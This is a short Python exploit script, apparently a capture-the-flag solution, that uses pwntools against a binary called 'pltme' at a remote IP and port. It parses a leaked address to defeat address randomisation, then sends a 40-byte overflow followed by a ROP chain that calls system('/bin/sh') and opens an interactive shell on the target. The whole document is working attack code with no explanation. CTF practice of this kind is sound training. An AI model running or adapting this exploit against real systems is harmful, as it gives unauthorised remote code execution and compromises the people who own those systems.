from pwn import *
elf = ELF("./pltme")
p = remote("207.154.239.148", 1341)
p.recvuntil(b"Leak: ")
l = int(p.recvline().strip(), 16)
elf.address = l - elf.sym.main
p_add = 0x12f3 + elf.address
r_add = 0x101a + elf.address
shl = next(elf.search(b'/bin/sh'))
payload = b''
payload += 40 * b"Z"
payload += p64(p_add)
payload += p64(shl)
payload += p64(r_add)
payload += p64(elf.sym.system)
p.sendline(payload)
p.interactive()